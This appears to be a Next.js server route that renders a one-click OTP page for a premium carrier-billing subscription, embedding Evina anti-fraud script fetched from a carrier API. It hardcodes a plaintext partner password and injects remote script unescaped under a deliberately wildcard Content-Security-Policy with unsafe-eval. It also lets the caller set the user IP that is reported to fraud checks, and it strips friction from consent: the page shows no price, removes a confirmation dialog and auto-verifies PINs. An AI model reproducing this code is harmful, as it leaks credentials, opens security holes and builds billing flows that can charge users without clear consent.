import { NextRequest } from 'next/server';

const PIN_REQUEST_URL =
  'https://vivavas1.future-club.com/fcc-evina-pin-flow-apis/PinRequest';

const SERVER_PARAMS = {
  UserId: '166',
  Password: 'Mobility_MI@123',
  ProductId: '479',
  TelcoId: '7',
  ShortCode: '50995',
  ConfirmButtonHTMLId: 'confirmBtn',
  CampaignURL: '',
  ContentURL: '',
};

/**
 * Serves the OTP page as a traditional server-rendered HTML page.
 *
 * This is the KEY fix for Evina 2501: the Evina JS is injected into <head>
 * as part of the initial HTML response — exactly like the client's ASP.NET
 * reference implementation. The browser loads the page with Evina JS already
 * present, so DOMContentLoaded fires with Evina running from the start.
 *
 * Previously, Evina JS was dynamically injected via JavaScript after React
 * hydration. Evina detected this (document.readyState === 'complete' at
 * injection time) and flagged the session as "remotely controlled fraud" (2501).
 */
export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const msisdn = searchParams.get('msisdn') || '';
  const trxId = searchParams.get('trxId') || '';
  const userIP = searchParams.get('userIP') || '127.0.0.1';

  if (!msisdn || !trxId) {
    return new Response('Missing msisdn or trxId', { status: 400 });
  }

  // ── Call PinRequest server-side to get Evina JS ─────────────────────────
  // Retry up to 3 times if carrier returns non-zero status (e.g. Status 7)
  let evinaJS = '';
  let pinRequestStatus = '';
  let usedTrxId = trxId;

  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      const payload = {
        MSISDN: msisdn,
        TransactionId: usedTrxId,
        Headers: request.headers.get('user-agent') || '',
        UserIP: userIP,
        ...SERVER_PARAMS,
      };

      console.log(`[otp-page] PinRequest attempt ${attempt}:`, { ...payload, Password: '***' });

      const res = await fetch(PIN_REQUEST_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const raw = await res.json();
      pinRequestStatus = String(raw.Status ?? raw.status ?? raw.STATUS ?? '');
      evinaJS = String(raw.JS ?? raw.js ?? raw.Javascript ?? '');

      // Strip <script> wrappers if present
      evinaJS = evinaJS
        .trim()
        .replace(/^<script[^>]*>/i, '')
        .replace(/<\/script\s*>$/i, '')
        .trim();

      console.log(`[otp-page] Attempt ${attempt} → Status: ${pinRequestStatus}, JS len: ${evinaJS.length}`);

      if (pinRequestStatus === '0' && evinaJS.length > 0) break;

      // Retry with fresh trxId after 1s delay
      if (attempt < 3) {
        usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
        await new Promise(r => setTimeout(r, 1000));
      }
    } catch (err) {
      console.error(`[otp-page] PinRequest attempt ${attempt} error:`, err);
      pinRequestStatus = 'error';
      if (attempt < 3) {
        usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
        await new Promise(r => setTimeout(r, 1000));
      }
    }
  }

  // Mask MSISDN for display
  const masked = msisdn.length > 5
    ? `+${msisdn.slice(0, 3)} ${msisdn.slice(3, 5)}XXX${msisdn.slice(-3)}`
    : msisdn;

  // ── Build the complete HTML page ────────────────────────────────────────
  // Evina JS goes in <head> — this is the critical difference from before.
  // The browser will parse and execute it during initial page load, exactly
  // like the ASP.NET reference: Page.Header.Controls.Add(new LiteralControl("<script>" + Session["JS"] + "</script>"))
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Verify OTP</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      min-height: 100vh;
      background: linear-gradient(135deg, #2563eb 0%, #1e3a8a 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    .card {
      background: white;
      border-radius: 16px;
      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
      padding: 32px;
      width: 100%;
      max-width: 384px;
      position: relative;
    }
    .icon-wrap {
      width: 64px; height: 64px;
      background: #dcfce7;
      border-radius: 50%;
      margin: 0 auto 16px;
      display: flex; align-items: center; justify-content: center;
    }
    .icon-wrap svg { width: 32px; height: 32px; color: #22c55e; }
    h1 { text-align: center; font-size: 24px; font-weight: 700; color: #1f2937; }
    .sub { text-align: center; color: #6b7280; font-size: 14px; margin-top: 4px; }
    .sub b { color: #374151; }
    .otp-row { display: flex; gap: 12px; justify-content: center; margin: 24px 0 8px; }
    .otp-input {
      width: 56px; height: 64px;
      text-align: center; font-size: 24px; font-weight: 700;
      border: 2px solid #d1d5db; border-radius: 12px;
      outline: none; transition: border-color 0.2s;
      -webkit-appearance: none;
    }
    .otp-input:focus { border-color: #3b82f6; }
    .otp-input.error { border-color: #f87171; background: #fef2f2; }
    .error-msg { text-align: center; color: #ef4444; font-size: 14px; min-height: 24px; margin-bottom: 16px; }
    .btn {
      width: 100%; padding: 14px; border: none; border-radius: 12px;
      font-size: 16px; font-weight: 600; cursor: pointer;
      transition: background 0.2s; min-height: 48px;
      display: flex; align-items: center; justify-content: center; gap: 8px;
    }
    .btn-primary { background: #2563eb; color: white; }
    .btn-primary:hover { background: #1d4ed8; }
    .spinner {
      width: 20px; height: 20px;
      border: 2px solid white; border-top-color: transparent;
      border-radius: 50%; animation: spin 0.8s linear infinite;
    }
    .spinner-dark {
      width: 40px; height: 40px;
      border: 3px solid #e5e7eb; border-top-color: #3b82f6;
      border-radius: 50%; animation: spin 0.8s linear infinite;
      margin: 0 auto 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .resend { text-align: center; margin-top: 20px; font-size: 14px; color: #6b7280; }
    .resend a { color: #3b82f6; text-decoration: underline; cursor: pointer; font-weight: 500; }
    .resend a:hover { color: #1d4ed8; }
    .debug-toggle { display: block; width: 100%; text-align: center; margin-top: 24px; padding-top: 12px; border-top: 1px solid #f3f4f6; font-size: 11px; color: #9ca3af; text-decoration: underline; cursor: pointer; background: none; border-left: 0; border-right: 0; border-bottom: 0; }
    .debug-panel { margin-top: 8px; background: #f9fafb; border-radius: 8px; padding: 8px; font-size: 11px; color: #4b5563; white-space: pre-wrap; word-break: break-all; max-height: 240px; overflow: auto; font-family: monospace; line-height: 1.4; }
    @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
    .shake { animation: shake 0.4s ease-in-out; }
    .phase-hidden { display: none !important; }
  </style>
  ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS returned -->'}
</head>
<body>
  <!-- Evina required elements — same as carrier's reference (fdc.aspx) -->
  <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - Télécharger - CONTINUER - ENTRER - S'ABONNER - اشترك الآن - VOIR - ACCEPT - اشترك الان - الاشتراك</a>
  <input id="otpValue" type="text" style="position:absolute;left:-9999px;opacity:0" tabindex="-1" autocomplete="off">
  <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>

  <div class="card">
    <!-- ═══════ PHASE 1: "Click to Watch" ═══════ -->
    <div id="phase1">
      <div class="icon-wrap">
        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
        </svg>
      </div>
      <h1>Premium Content</h1>
      <p class="sub">Tap below to start watching</p>
    </div>

    <!-- ═══════ PHASE 2: OTP Entry ═══════ -->
    <div id="phase2" class="phase-hidden">
      <div id="manualEntry" class="phase-hidden">
        <div class="icon-wrap">
          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
          </svg>
        </div>
        <h1>OTP Sent!</h1>
        <p class="sub">Enter the PIN sent to <b>${masked}</b></p>

        <div class="otp-row" id="otpRow">
          <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
        </div>

        <div class="error-msg" id="errorMsg"></div>
      </div>
    </div>

    <!-- Single confirmBtn — Evina monitors this throughout both phases -->
    <button class="btn btn-primary" id="confirmBtn">
      Click to Watch
    </button>

    <p class="resend phase-hidden" id="resendArea">
      Didn't receive the OTP? <a id="resendLink" onclick="handleResend()">Resend OTP</a>
    </p>

    <button class="debug-toggle" id="debugToggle" onclick="toggleDebug()">Show technical details</button>
    <div class="debug-panel" id="debugPanel" style="display:none"></div>
  </div>

  <script>
    // ── State ───────────────────────────────────────────────────────────────
    var MSISDN = ${JSON.stringify(msisdn)};
    var TRXID  = ${JSON.stringify(usedTrxId)};
    var PIN_REQUEST_STATUS = ${JSON.stringify(pinRequestStatus)};
    var EVINA_JS_LEN = ${evinaJS.length};
    var isVerifying = false;
    var resendCooldown = 0;
    var phase = 1; // 1 = "Click to Watch", 2 = auto-read / manual entry

    var pins = document.querySelectorAll('.otp-input');
    var confirmBtn = document.getElementById('confirmBtn');
    var errorMsg = document.getElementById('errorMsg');
    var otpValue = document.getElementById('otpValue');

    // ── Debug ───────────────────────────────────────────────────────────────
    function dbg(msg) {
      var ts = new Date().toLocaleTimeString();
      var line = '[' + ts + '] ' + msg;
      console.log(line);
      var p = document.getElementById('debugPanel');
      if (p) p.textContent = (p.textContent || '') + '\\n' + line;
    }
    function toggleDebug() {
      var p = document.getElementById('debugPanel');
      var t = document.getElementById('debugToggle');
      if (p.style.display === 'none') {
        p.style.display = 'block';
        t.textContent = 'Hide technical details';
      } else {
        p.style.display = 'none';
        t.textContent = 'Show technical details';
      }
    }

    dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID + ' evinaJS=' + (EVINA_JS_LEN > 0 ? 'yes(' + EVINA_JS_LEN + 'chars)' : 'NO'));
    dbg('PinRequest Status: ' + PIN_REQUEST_STATUS);
    dbg('Evina JS in <head>: ' + (EVINA_JS_LEN > 0 ? 'YES (server-rendered)' : 'NO'));
    dbg('DOM check: confirmBtn=' + !!document.getElementById('confirmBtn') + ' otpValue=' + !!document.getElementById('otpValue') + ' EvinaTestCanvas=' + !!document.getElementById('EvinaTestCanvas') + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
    dbg('Flow: one-click (Click to Watch → auto SMS read → auto verify)');

    // ── OTP Input handling (for manual fallback) ────────────────────────────
    function getFullPin() {
      var val = '';
      pins.forEach(function(p) { val += p.value; });
      return val.replace(/\\D/g, '');
    }

    pins.forEach(function(input, i) {
      input.addEventListener('input', function(e) {
        var val = input.value.replace(/\\D/g, '');

        // Multi-digit autofill from keyboard suggestion (autocomplete="one-time-code")
        if (val.length > 1 && i === 0) {
          var code = val.slice(0, 4);
          dbg('Keyboard autofill detected: "' + code + '"');
          for (var j = 0; j < 4; j++) { pins[j].value = code[j] || ''; }
          if (otpValue) otpValue.value = code;
          clearError();
          if (code.length === 4) {
            pins[3].focus();
            // If in phase 2, auto-verify
            if (phase === 2) {
              dbg('Auto-verifying from keyboard autofill');
              setTimeout(function() { verifyPin(code); }, 300);
            }
          }
          return;
        }

        input.value = val.slice(-1);
        clearError();
        if (val && i < 3) pins[i + 1].focus();
        var full = getFullPin();
        if (otpValue) otpValue.value = full;
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (input.value) { input.value = ''; }
          else if (i > 0) { pins[i - 1].focus(); }
        }
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\\D/g, '').slice(0, 4);
        for (var j = 0; j < 4; j++) { pins[j].value = text[j] || ''; }
        if (otpValue) otpValue.value = text;
        clearError();
        pins[Math.min(text.length, 3)].focus();
      });
    });

    // ── Error handling ──────────────────────────────────────────────────────
    function showError(msg) {
      errorMsg.textContent = msg;
      pins.forEach(function(p) { p.classList.add('error'); });
      document.getElementById('otpRow').classList.add('shake');
      setTimeout(function() { document.getElementById('otpRow').classList.remove('shake'); }, 500);
    }
    function clearError() {
      errorMsg.textContent = '';
      pins.forEach(function(p) { p.classList.remove('error'); });
    }

    // ── Phase transitions ───────────────────────────────────────────────────
    function goToPhase2() {
      phase = 2;
      document.getElementById('phase1').classList.add('phase-hidden');
      document.getElementById('phase2').classList.remove('phase-hidden');

      // Go directly to OTP input — no "Reading SMS" spinner
      // autocomplete="one-time-code" on pin0 will show OTP as keyboard suggestion
      showManualEntry();
      dbg('Phase 2: OTP input shown — waiting for keyboard autofill or manual entry');
    }

    function showManualEntry() {
      document.getElementById('manualEntry').classList.remove('phase-hidden');
      document.getElementById('resendArea').classList.remove('phase-hidden');
      confirmBtn.textContent = 'Continue to Watch';
      setTimeout(function() { pins[0].focus(); }, 100);
      dbg('OTP input ready — keyboard autofill or manual entry');
    }

    // ── No Web OTP API ─────────────────────────────────────────────────────
    // Web OTP API was removed because it shows a Chrome "Allow" permission
    // dialog that counts as a second click. Instead we rely on:
    // 1. autocomplete="one-time-code" on the first OTP input — shows the
    //    OTP as a passive keyboard suggestion (no dialog/permission needed)
    // 2. The multi-digit autofill handler auto-verifies when 4 digits fill
    dbg('OTP capture: using keyboard autofill (autocomplete="one-time-code")');


    // ── Confirm button — single button for both phases ──────────────────────
    confirmBtn.addEventListener('click', function() {
      dbg('confirmBtn clicked — phase=' + phase);

      if (phase === 1) {
        // Phase 1: "Click to Watch" → start auto-read flow
        goToPhase2();
      } else if (phase === 2) {
        // Phase 2: manual entry → verify PIN
        var pin = getFullPin();
        if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
          pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
        }
        dbg('Manual verify — pin="' + pin + '"');
        if (pin.length !== 4 || isVerifying) return;
        verifyPin(pin);
      }
    });

    // ── Verify PIN ──────────────────────────────────────────────────────────
    function verifyPin(pin) {
      isVerifying = true;
      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
      clearError();
      dbg('Verifying PIN: "' + pin + '" (len=' + pin.length + ')');

      fetch('/api/pin-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ TransactionId: TRXID, Pin: pin, MSISDN: MSISDN })
      })
      .then(function(r) { return r.json(); })
      .then(function(data) {
        dbg('PinVerify → Status="' + data.Status + '" raw=' + JSON.stringify(data.raw || {}));
        if (data.Status === '0' || data.Status === '103') {
          dbg('SUCCESS — redirecting to /thankyou');
          window.location.href = '/thankyou';
        } else {
          showManualEntry();
          showError('Invalid PIN (code: ' + data.Status + '). Please check and try again.');
          pins.forEach(function(p) { p.value = ''; });
          if (otpValue) otpValue.value = '';
          setTimeout(function() { pins[0].focus(); }, 50);
        }
      })
      .catch(function(err) {
        dbg('PinVerify ERROR: ' + err);
        showManualEntry();
        showError('Network error. Please try again.');
      })
      .finally(function() {
        isVerifying = false;
        confirmBtn.innerHTML = 'Continue to Watch';
      });
    }

    // ── Resend OTP ──────────────────────────────────────────────────────────
    function handleResend() {
      if (resendCooldown > 0) return;
      dbg('Resending OTP — full page reload with new trxId...');
      var newTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
      window.location.href = '/api/otp-page?msisdn=' + encodeURIComponent(MSISDN) + '&trxId=' + newTrxId + '&userIP=127.0.0.1';
    }
  </script>
</body>
</html>`;

  return new Response(html, {
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      // CSP must allow Evina inline scripts and WebSocket
      // Fully permissive CSP — Evina's JS needs to connect to various
      // servers (WebSocket, HTTP) and we don't know all the URLs it uses.
      'Content-Security-Policy': [
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
        "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
        "connect-src * wss: ws: https: http: data: blob:",
        "style-src * 'unsafe-inline'",
        "img-src * data: blob:",
        "font-src * data:",
        "frame-src *",
      ].join('; '),
    },
  });
}
